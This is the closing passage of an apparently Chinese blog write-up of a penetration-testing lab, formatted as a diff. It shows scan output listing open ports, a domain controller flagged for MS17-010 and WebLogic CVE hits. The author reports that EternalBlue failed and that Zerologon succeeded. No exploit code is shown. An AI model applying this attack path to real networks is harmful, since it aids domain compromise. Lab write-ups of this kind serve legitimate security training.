+<span class="hljs-number">192.168.20.20:7001</span> open
+<span class="hljs-number">192.168.20.30:445</span> open
+<span class="hljs-number">192.168.20.30:139</span> open
+<span class="hljs-number">192.168.20.20:139</span> open
+<span class="hljs-number">192.168.20.30:80</span> open
+<span class="hljs-number">192.168.20.20:445</span> open
+<span class="hljs-number">192.168.20.30:88</span> open
+<span class="hljs-string">[*]</span> NetBios <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>   cyberweb.cyberstrikelab.com         Windows Server <span class="hljs-number">2012</span> R2 Standard <span class="hljs-number">9600</span>
+<span class="hljs-string">[*]</span> NetBios <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">30</span>   <span class="hljs-string">[+]</span> DC:WIN-9DJ4TH21IE9.cyberstrikelab.com      Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span>
+<span class="hljs-string">[+]</span> MS17-<span class="hljs-number">010</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">30</span>	(Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span>)
+<span class="hljs-string">[*]</span> NetInfo 
+<span class="hljs-string">[*]</span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">30</span>
+   <span class="hljs-string">[-&gt;]</span>WIN-9DJ4TH21IE9
+   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">30</span>
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">30</span>      code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server
+<span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">30</span> poc-yaml-active-directory-certsrv-detect 
+<span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> code:<span class="hljs-number">404</span> len:<span class="hljs-number">1164</span> a  title:Error <span class="hljs-number">404</span>--Not Found
+<span class="hljs-string">[+]</span> InfoScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> <span class="hljs-string">[weblogic]</span> 
+<span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> poc-yaml-weblogic-cve-<span class="hljs-number">2020</span>-<span class="hljs-number">14750</span> 
+<span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">20</span>.<span class="hljs-number">20</span>:<span class="hljs-number">7001</span> poc-yaml-weblogic-cve-<span class="hljs-number">2019</span>-<span class="hljs-number">2725</span> v12
+</code></pre></div>
+
+
+
+<p>这sb永痕之蓝，每次都打不成功，打一次我的代理就掉一次</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515215452093.png" srcset="/img/loading.gif" lazyload alt="image-20250515215452093"></p>
+<p>最后还是zerologon乱杀</p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515215518775.png" srcset="/img/loading.gif" lazyload alt="image-20250515215518775"></p>
+<p><img src="/../images/cyberstrikelab-lab/image-20250515215527274.png" srcset="/img/loading.gif" lazyload alt="image-20250515215527274"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>cyberstrikelab-lab</div>
+      <div>https://zer0peach.github.io/2025/05/08/cyberstrikelab-lab/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/06/25/DASCTF2025-%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B-web/" title="DASCTF2025 上半年赛 web">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DASCTF2025 上半年赛 web</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/13/HGAME2025-SigninJava/" title="HGAME2025-SigninJava">
+                        <span class="hidden-mobile">HGAME2025-SigninJava</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
